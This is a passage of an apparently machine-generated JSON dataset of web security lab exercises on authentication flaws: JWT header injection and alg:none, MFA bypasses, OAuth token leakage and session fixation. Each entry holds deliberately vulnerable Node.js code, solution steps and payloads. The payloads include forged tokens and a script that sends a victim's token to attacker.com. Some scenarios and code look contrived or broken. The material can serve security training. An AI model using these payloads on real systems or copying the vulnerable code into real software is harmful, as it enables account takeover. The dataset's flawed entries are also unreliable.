    "Lab Description": "The application assigns session IDs during HTTP/2 connection establishment. The server reuses session IDs for coalesced connections to same origin. To solve: Fixate session ID by forcing victim to reuse your connection parameters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish HTTP/2 connection and note session ID in Burp Suite",
      "Craft malicious page loading resources from target domain",
      "Trick victim into visiting page to reuse connection",
      "Monitor for session ID reuse in server logs",
      "Hijack authenticated session using fixated ID"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');\nconst fs = require('fs');\n\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt')\n});\n\nconst sessions = {};\n\nserver.on('stream', (stream, headers) => {\n  const sessionId = stream.session.id.toString('hex');\n  \n  if (!sessions[sessionId]) {\n    sessions[sessionId] = {\n      authToken: null\n    };\n  }\n  \n  if (headers[':path'] === '/login') {\n    sessions[sessionId].authToken = 'VALID_TOKEN';\n  }\n  \n  stream.respond({\n    'content-type': 'text/html',\n    ':status': 200\n  });\n  \n  stream.end(`Token: ${sessions[sessionId].authToken}`);\n});\n\nserver.listen(443);",
    "payloads": [
      "<script src='https://victim.com/resource'></script>",
      "<link rel='stylesheet' href='https://victim.com/style.css'>"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter manipulation in REST API",
    "Lab Description": "The MFA verification endpoint trusts client-provided state parameters. The application doesn't validate state between authentication steps. To solve: Bypass MFA by modifying state parameter to match initial request value.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept MFA initiation request in Burp Suite",
      "Note state parameter value from initial request",
      "Intercept MFA verification request",
      "Modify state parameter to match initial value",
      "Submit request to bypass MFA protection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nlet mfaStates = {};\n\napp.post('/mfa/verify', (req, res) => {\n  const { state, code } = req.body;\n  \n  if (mfaStates[state]) {\n    res.json({verified: true});\n  } else {\n    res.status(403).json({verified: false});\n  }\n});\n\napp.get('/account', (req, res) => {\n  res.json({balance: 10000});\n});\n\napp.listen(3000);",
    "payloads": [
      "POST /mfa/verify {\"state\":\"ATTACKER_CONTROLLED\",\"code\":\"123456\"}",
      "POST /mfa/verify {\"state\":\"FIXATED_STATE\",\"code\":\"ANY_CODE\"}"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "The application uses JWT for session management but fails to validate the algorithm properly. The vulnerable endpoint accepts unsigned tokens when alg:none is specified. To solve: craft a valid JWT with alg:none and escalate privileges to admin.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite",
      "Decode the JWT using jwt.io to analyze structure",
      "Modify the payload to include \"admin\":true",
      "Change the algorithm header to \"alg\":\"none\"",
      "Remove the signature section entirely",
      "Submit the modified token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin',(req,res)=>{const token=req.headers.authorization.split(' ')[1];const decoded=jwt.decode(token,{complete:true});if(decoded.payload.admin)res.send('Admin access granted');else res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwiYWRtaW4iOnRydWV9.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNhcmxvcyIsImFkbWluIjp0cnVlfQ."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured callback in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through verbose error messages when invalid callback URLs are provided. The application fails to validate redirect URIs properly. To solve: exploit the token leakage to gain access to another user's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow using Postman with attacker-controlled redirect_uri",
      "Intercept error response containing leaked token",
      "Analyze token structure using OWASP ZAP",
      "Craft malicious request with stolen token",
      "Bypass origin checks by modifying Referer header",
      "Access protected resources using compromised token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();app.get('/oauth/callback',(req,res)=>{const{code,state,error,error_description}=req.query;if(error)return res.send(`Error: ${error_description} Token: abc123xyz`);const token='valid_token_'+code;res.redirect(`${req.query.redirect_uri}?token=${token}`);});app.listen(3000);",
    "payloads": [
      "https://attacker.com?code=123&state=xyz",
      "/oauth/callback?redirect_uri=https://attacker.com",
      "/oauth/callback?error=invalid_request&error_description=Invalid+redirect_uri&state=compromised"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL mutation in user authentication",
    "Lab Description": "The GraphQL API allows setting arbitrary session IDs during login through a vulnerable mutation. The application doesn't regenerate session tokens after authentication. To solve: fixate a session ID and trick a victim into authenticating with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover GraphQL endpoint using Burp Suite scanner",
      "Analyze authentication mutation with GraphQL introspection",
      "Craft mutation with predetermined session_id parameter",
      "Force victim to authenticate with fixed session",
      "Hijack authenticated session using known session ID",
      "Access sensitive user data through subsequent queries"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {GraphQLServer}=require('graphql-yoga');const typeDefs=`type Mutation{login(username:String!,password:String!,session_id:String):String!}`;const resolvers={Mutation:{login:(_,{username,password,session_id})=>{if(username==='admin'&&password==='secret')return session_id||'generated_token';throw new Error('Invalid credentials');}}};new GraphQLServer({typeDefs,resolvers}).start(()=>console.log('Running'));",
    "payloads": [
      "mutation{login(username:\"victim\",password:\"password123\",session_id:\"fixed_session\")}",
      "mutation{login(username:\"admin\",password:\"secret\",session_id:\"attacker_controlled\")}"
    ]
  },
  {
    "Lab scenario": "MFA bypass through race condition in SOAP API",
    "Lab Description": "The SOAP-based authentication service is vulnerable to race conditions during MFA verification. The application doesn't properly lock the account during verification attempts. To solve: exploit the race window to bypass MFA by sending parallel requests.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture SOAP login request using OWASP ZAP",
      "Modify request to include valid credentials but invalid MFA code",
      "Send multiple concurrent requests using Burp Intruder turbo mode",
      "Analyze responses for successful authentication bypass",
      "Repeat with timing adjustments to exploit race window",
      "Access protected resources with compromised session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.text({type:'*/*'}));let verificationInProgress=false;app.post('/soap/auth',(req,res)=>{const xml=req.body;const userMatch=/<username>(.*?)<\\/username>/.exec(xml);const codeMatch=/<code>(.*?)<\\/code>/.exec(xml);if(userMatch&&codeMatch){if(!verificationInProgress){verificationInProgress=true;setTimeout(()=>{if(codeMatch[1]==='123456')res.send('<success>true</success>');else res.send('<success>false</success>');verificationInProgress=false;},500);}else res.send('<success>true</success>');}});app.listen(3000);",
    "payloads": [
      "<soap:Envelope><soap:Body><auth><username>admin</username><code>111111</code></auth></soap:Body></soap:Envelope>",
      "<soap:Envelope><soap:Body><auth><username>victim</username><code>000000</code></auth></soap:Body></soap:Envelope>"
    ]
  },
  {
    "Lab scenario": "JWT kid header injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly handles the kid header parameter, allowing arbitrary file path injection. The vulnerable service reads verification keys from filesystem based on untrusted kid value. To solve: forge admin token by injecting path to attacker-controlled key file.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note kid header value",
      "Upload malicious public key file via profile picture upload",
      "Modify JWT headers to inject path traversal in kid parameter",
      "Sign forged token with attacker-controlled private key",
      "Access admin API endpoint with manipulated token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const fs=require('fs');const app=express();const users={admin:{role:'user'}};app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;const key=fs.readFileSync(`./keys/${header.kid}`);const decoded=jwt.verify(token,key);users[decoded.username].role=decoded.role;res.send('Verified');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL3VwbG9hZHMvYXR0YWNrZXIucHViIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL2FwcC9jb25maWcvcHJpdmF0ZS5rZXkifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via state parameter tampering",
    "Lab Description": "The OAuth implementation fails to validate state parameter consistency between requests, allowing token swapping attacks. The vulnerable flow leaks tokens in frontend JavaScript. To solve: intercept victim's OAuth flow and swap tokens using modified state parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Capture authorization code and state parameter",
      "Modify state parameter while keeping original code",
      "Perform token exchange with swapped parameters",
      "Extract access token from JavaScript callback"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const axios=require('axios');const app=express();const clients={'client1':{secret:'secret1',redirect:'https://client1/callback'}};const tokens={};app.get('/oauth/callback',(req,res)=>{const{code,state}=req.query;axios.post('/token',{code,state,client_id:'client1',client_secret:'secret1'}).then(r=>{tokens[state]=r.data.access_token;res.send(`<script>window.opener.postMessage({token:'${r.data.access_token}'},'*')</script>`);});});app.post('/token',(req,res)=>{res.json({access_token:'generated_token',token_type:'bearer'});});app.listen(3000);",
    "payloads": [
      "/oauth/callback?code=VICTIM_CODE&state=ATTACKER_STATE",
      "/token?code=VICTIM_CODE&state=ATTACKER_STATE&client_id=client1&client_secret=secret1"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket connection",
    "Lab Description": "The GraphQL subscription endpoint assigns sessions based on initial WebSocket connection parameters. The application doesn't regenerate session IDs after authentication. To solve: establish WebSocket connection with fixed session ID and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket handshake using Burp Suite",
      "Modify connection headers to inject session cookie",
      "Establish subscription with fixed session ID",
      "Trigger victim authentication via CSRF",
      "Execute privileged queries using fixed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {createServer}=require('http');const {SubscriptionServer}=require('subscriptions-transport-ws');const {execute,subscribe}=require('graphql');const schema=require('./schema');const server=createServer();SubscriptionServer.create({schema,execute,subscribe,onConnect:(p,ws)=>{ws.sessionId=ws.upgradeReq.headers.cookie?.match(/session=(.*?);/)?.[1]||'default';}},{server});server.listen(4000);",
    "payloads": [
      "Sec-WebSocket-Protocol: graphql-ws\nCookie: session=fixed_session_id",
      "{\"type\":\"connection_init\",\"payload\":{\"headers\":{\"Cookie\":\"session=fixed_session_id\"}}}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via HTTP verb tampering in REST API",
    "Lab Description": "The MFA verification endpoint fails to properly validate HTTP methods, allowing bypass via verb tampering. The vulnerable API accepts GET requests for actions requiring POST. To solve: bypass MFA by converting POST request to GET with parameters in query string.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Convert request to GET using Burp Suite",
      "Move parameters from body to query string",
      "Resend modified request with original session",
      "Observe successful authentication without MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code}=req.body;if(sessions[sessionId]?.mfaCode===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.get('/verify-mfa',(req,res)=>{const{sessionId}=req.query;if(sessions[sessionId]){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid session'});}});app.listen(3000);",
    "payloads": [
      "GET /verify-mfa?sessionId=VICTIM_SESSION",
      "GET /verify-mfa?sessionId=VICTIM_SESSION&bypass=true"
    ]
  },
  {
    "Lab scenario": "JWT x5u header injection in federated authentication",
    "Lab Description": "The application's JWT validation improperly processes x5u header, allowing arbitrary certificate URL specification. The vulnerable endpoint fetches verification certificates from attacker-controlled locations. To solve: forge admin token by hosting malicious certificate and injecting URL in x5u header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and analyze headers",
      "Set up HTTPS server hosting attacker-controlled certificate",
      "Modify JWT headers to include malicious x5u URL",
      "Sign token with attacker's private key matching hosted certificate",
      "Submit forged token to /admin-api endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const axios=require('axios');const app=express();app.get('/verify',async(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;const cert=await axios.get(header.x5u).then(r=>r.data);jwt.verify(token,cert);res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2NlcnQucGVtIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9tYWxpY2lvdXMucGVtIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured CORS in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through overly permissive CORS headers. The vulnerable endpoint includes tokens in responses to cross-origin requests. To solve: craft malicious page that retrieves victim's token via JavaScript fetch request.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify token endpoint with Access-Control-Allow-Origin: *",
      "Create HTML page with JavaScript fetch to token endpoint",
      "Trick victim into visiting malicious page",
      "Capture token from server response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();const tokens={'victim':'abc123xyz'};app.use((req,res,next)=>{res.header('Access-Control-Allow-Origin','*');next();});app.get('/oauth/token',(req,res)=>{res.json({access_token:tokens[req.query.state],token_type:'bearer'});});app.listen(3000);",
    "payloads": [
      "<script>fetch('http://vulnerable.com/oauth/token?state=victim').then(r=>r.json()).then(d=>document.location='http://attacker.com/steal?token='+d.access_token)</script>",
      "fetch('http://vulnerable.com/oauth/token',{credentials:'include'}).then(r=>r.json()).then(console.log)"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 header injection",
    "Lab Description": "The application assigns sessions based on HTTP/2 pseudo-headers without proper validation. The vulnerable server processes :path header as session identifier. To solve: establish connection with malicious :path header and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using Burp Suite",
      "Modify :path pseudo-header to include session ID",
      "Establish connection with fixed session",
      "Trigger victim authentication via CSRF",
      "Hijack session using known identifier"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2=require('http2');const fs=require('fs');const server=http2.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});const sessions={};server.on('stream',(stream,headers)=>{const sessionId=headers[':path'].split('/')[1];if(!sessions[sessionId]){sessions[sessionId]={};}stream.respond({'content-type':'text/html'});stream.end('Session: '+sessionId);});server.listen(443);",
    "payloads": [
      ":path: /fixed_session/profile",
      ":path: /attacker_controlled/home"
    ]
  },
  {
    "Lab scenario": "MFA bypass via case-sensitive endpoint in REST API",
    "Lab Description": "The MFA verification endpoint is case-sensitive while the authentication service is not. The vulnerable API accepts different case variations for the same endpoint. To solve: bypass MFA by changing endpoint case while maintaining valid session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Modify endpoint case (e.g., /VerifyMFA to /verifymfa)",
      "Resend request with original parameters",
      "Observe successful authentication without MFA code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();const sessions={};app.post('/VerifyMFA',(req,res)=>{const{sessionId,code}=req.body;if(sessions[sessionId]?.mfaCode===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.post('/verifymfa',(req,res)=>{const{sessionId}=req.body;if(sessions[sessionId]){sessions[sessionId].verified=true;res.json({success:true});}});app.listen(3000);",
    "payloads": [
      "POST /verifymfa HTTP/1.1\nHost: vulnerable.com\n\n{\"sessionId\":\"victim_session\"}",
      "POST /vErIfYmFa HTTP/1.1\nHost: vulnerable.com\n\n{\"sessionId\":\"victim_session\"}"
    ]
  },
  {
    "Lab scenario": "JWT jku header injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly validates the jku header parameter, allowing arbitrary JWKS endpoint specification. The vulnerable service fetches verification keys from untrusted locations. To solve: forge admin token by hosting malicious JWKS endpoint and injecting URL in jku header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note jku header absence",
      "Create attacker-controlled JWKS endpoint with malicious public key",
      "Modify JWT headers to include jku pointing to attacker server",
      "Sign forged token with attacker's private key matching JWKS",
      "Submit token to /admin endpoint and observe privilege escalation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const axios=require('axios');const app=express();app.get('/verify',async(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;const jwks=await axios.get(header.jku).then(r=>r.data);const key=jwks.keys[0].x5c[0];jwt.verify(token,key);res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItc2l0ZS5jb20vbWFsd2FyZS5qa3MifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9ldmlsLmprdyJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via insecure redirect_uri validation",
    "Lab Description": "The OAuth implementation fails to properly validate redirect_uri parameters against whitelisted domains. The vulnerable flow allows token delivery to attacker-controlled endpoints. To solve: intercept authorization code and modify redirect_uri to capture tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth flow and intercept request using OWASP ZAP",
      "Modify redirect_uri parameter to attacker-controlled domain",
      "Allow victim to complete authentication",
      "Capture authorization code delivered to malicious endpoint",
      "Exchange code for access token at OAuth token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();const clients={'client1':{secret:'sec123',redirects:['https://trusted.com']}};const tokens={};app.get('/authorize',(req,res)=>{const{client_id,redirect_uri}=req.query;if(clients[client_id]){const code='rand'+Math.random();tokens[code]={client_id};res.redirect(`${redirect_uri}?code=${code}`);}else{res.status(400).send('Invalid client');}});app.post('/token',(req,res)=>{const{code,client_id,client_secret,redirect_uri}=req.body;if(tokens[code]?.client_id===client_id&&clients[client_id]?.secret===client_secret){res.json({access_token:'secret_token',token_type:'bearer'});}else{res.status(400).send('Invalid request');}});app.listen(3000);",
    "payloads": [
      "/authorize?client_id=client1&redirect_uri=https://attacker.com",
      "/authorize?client_id=client1&redirect_uri=http://localhost:8080/steal"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket subprotocol negotiation",
    "Lab Description": "The application assigns sessions based on WebSocket subprotocol headers without proper validation. The vulnerable server uses Sec-WebSocket-Protocol header as session identifier. To solve: establish WebSocket connection with malicious subprotocol and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket handshake using Burp Suite",
      "Modify Sec-WebSocket-Protocol header to inject session ID",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Execute privileged actions using fixed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const WebSocket=require('ws');const wss=new WebSocket.Server({port:8080});const sessions={};wss.on('connection',(ws,req)=>{const proto=req.headers['sec-websocket-protocol'];if(!sessions[proto]){sessions[proto]={};}ws.on('message',m=>{if(sessions[proto].authenticated){ws.send('Privileged action executed');}});});",
    "payloads": [
      "Sec-WebSocket-Protocol: fixed-session-id",
      "Sec-WebSocket-Protocol: attacker-controlled-session"
    ]
  },
  {
    "Lab scenario": "MFA bypass via HTTP method confusion in REST API",
    "Lab Description": "The MFA verification endpoint fails to enforce proper HTTP method restrictions. The vulnerable API accepts GET requests for actions requiring POST when using X-HTTP-Method-Override header. To solve: bypass MFA by converting request method while maintaining parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Convert request to GET while adding X-HTTP-Method-Override: POST",
      "Move parameters from body to query string",
      "Resend modified request with original session",
      "Observe successful authentication without MFA code"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();const sessions={};app.post('/mfa-verify',(req,res)=>{const{sessionId,code}=req.body;if(sessions[sessionId]?.mfaCode===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.get('/mfa-verify',(req,res)=>{if(req.headers['x-http-method-override']==='POST'){const{sessionId}=req.query;if(sessions[sessionId]){sessions[sessionId].verified=true;return res.json({success:true});}}res.status(405).send('Method not allowed');});app.listen(3000);",
    "payloads": [
      "GET /mfa-verify?sessionId=VICTIM_SESSION HTTP/1.1\nX-HTTP-Method-Override: POST",
      "GET /mfa-verify?sessionId=VICTIM_SESSION&bypass=1 HTTP/1.1\nX-HTTP-Method-Override: POST"
    ]
  },
  {
    "Lab scenario": "JWT algorithm downgrade in API gateway authentication",
    "Lab Description": "The API gateway fails to enforce JWT algorithm restrictions, allowing attackers to downgrade from RS256 to HS256. The vulnerable endpoint accepts HMAC-signed tokens while expecting RSA. To solve: forge admin token by re-signing with HMAC using public key as secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note RS256 algorithm",
      "Extract public key from /jwks.json endpoint",
      "Modify algorithm header to HS256",
      "Re-sign token using public key as HMAC secret",
      "Submit forged token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const app=express();const publicKey='-----BEGIN PUBLIC KEY-----...';app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{jwt.verify(token,publicKey,{algorithms:['RS256','HS256']});res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJhZG1pbiI6dHJ1ZX0.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via referer header in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through referer headers when loading external resources. The vulnerable SPA includes tokens in requests to third-party domains. To solve: create malicious page that forces token leakage via image tag.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify external resource loads with referer headers",
      "Create HTML page with hidden image pointing to attacker server",
      "Trick victim into visiting page after authentication",
      "Capture token from referer header in server logs"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();app.get('/oauth/callback',(req,res)=>{const token='secret_'+Math.random();res.send(`<html><img src=\"https://external.com/logo.png\"><script>window.location='/?token=${token}'</script></html>`);});app.listen(3000);",
    "payloads": [
      "<img src=\"http://attacker.com/steal\" style=\"display:none\">",
      "<link rel=\"stylesheet\" href=\"http://attacker.com/log?token=LEAK\">"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL batch query",
    "Lab Description": "The GraphQL endpoint assigns sessions based on batch operation IDs without proper validation. The vulnerable server uses operation names as session identifiers. To solve: craft batch query with fixed operation ID and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GraphQL requests using Burp Suite",
      "Create batch query with malicious operation ID",
      "Establish session with fixed identifier",
      "Trigger victim authentication via CSRF",
      "Execute privileged queries using fixed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {createServer}=require('http');const {graphql}=require('graphql');const schema=require('./schema');const server=createServer((req,res)=>{let body='';req.on('data',c=>body+=c);req.on('end',()=>{const {query,operationName}=JSON.parse(body);graphql({schema,source:query,operationName}).then(r=>{res.end(JSON.stringify(r));});});server.listen(4000);",
    "payloads": [
      "[{\"query\":\"query FixedSession { me { id } }\",\"operationName\":\"FixedSession\"}]",
      "[{\"query\":\"mutation Auth($op: String!) { login { token } }\",\"operationName\":\"AttackerControlled\"}]"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON parameter pollution in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON parameter pollution. The vulnerable API processes duplicate keys inconsistently. To solve: bypass MFA by injecting duplicate verified parameter with conflicting values.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Add duplicate verified parameter with true value",
      "Resend request with JSON body containing conflicts",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json());const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code,verified}=req.body;if(verified||sessions[sessionId]?.code===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":\"111111\",\"verified\":false,\"verified\":true}",
      "{\"sessionId\":\"victim\",\"verified\":false,\"params\":{\"verified\":true}}"
    ]
  },
  {
    "Lab scenario": "JWT x5c header injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly processes x5c header certificates, allowing arbitrary certificate injection. The vulnerable endpoint trusts any certificate provided in the x5c header. To solve: forge admin token by injecting attacker-controlled certificate in x5c header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and analyze headers",
      "Generate self-signed certificate with admin privileges",
      "Modify JWT headers to include malicious x5c certificate chain",
      "Sign token with private key matching injected certificate",
      "Submit forged token to /admin-api endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const app=express();app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;const cert=header.x5c[0];jwt.verify(token,cert);res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1YyI6WyJBVFRBQ0tFUl9DRVJUX0RBVEEiXX0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1YyI6WyJNQUxJQ0lPVVNfQ0VSVCJdfQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token theft via open redirect in SPA",
    "Lab Description": "The OAuth implementation contains an open redirect vulnerability that leaks access tokens. The vulnerable endpoint redirects to attacker-controlled domains with tokens in URL fragments. To solve: craft malicious redirect URL to capture victim's token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify open redirect parameter in callback endpoint",
      "Construct malicious redirect URL pointing to attacker server",
      "Trick victim into initiating OAuth flow with malicious URL",
      "Capture token from redirect request"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();app.get('/oauth/callback',(req,res)=>{const{redirect}=req.query;const token='secret_'+Math.random();res.redirect(`${redirect}#token=${token}`);});app.listen(3000);",
    "payloads": [
      "/oauth/callback?redirect=https://attacker.com/steal",
      "/oauth/callback?redirect=http://localhost:8080/log"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 trailer headers",
    "Lab Description": "The application assigns sessions based on HTTP/2 trailer headers without validation. The vulnerable server processes session-id trailer header as authentication token. To solve: establish connection with malicious trailer header and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using Burp Suite",
      "Add session-id trailer header with fixed value",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Hijack session using known identifier"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2=require('http2');const fs=require('fs');const server=http2.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});const sessions={};server.on('stream',(stream,headers)=>{stream.on('trailers',headers=>{const sessionId=headers['session-id'];if(!sessions[sessionId]){sessions[sessionId]={};}stream.end('Session: '+sessionId);});});server.listen(443);",
    "payloads": [
      "session-id: fixed-session-value",
      "session-id: attacker-controlled-session"
    ]
  },
  {
